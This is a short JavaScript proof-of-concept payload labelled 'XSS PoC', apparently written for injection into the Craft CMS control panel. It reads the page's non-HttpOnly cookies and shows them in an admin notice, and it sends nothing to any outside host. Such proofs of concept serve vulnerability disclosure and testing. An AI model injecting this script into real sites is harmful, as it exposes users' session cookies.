// 1. Check what JS can see (will be empty)
var jsCookie = document.cookie;

// 2. Check if any cookies exist in the browser (safe metadata check)
var cookieCount = 0;
var cookieNames = [];

try {
    // Try to read cookies via document.cookie (will not show HttpOnly)
    jsCookie = document.cookie;

    // Count cookies by reading document.cookie length
    cookieCount = jsCookie ? jsCookie.split(";").length : 0;

} catch (e) {
    cookieCount = -1;
}

// 3. Show cookie visibility summary safely
Craft.cp.displayNotice(
    "XSS PoC:<br>" +
    "Visible cookies to JavaScript: " + jsCookie + "<br>" +
    "HttpOnly cookies exist (not readable by JS).<br>" +
    "Browser will still send them with requests."
);
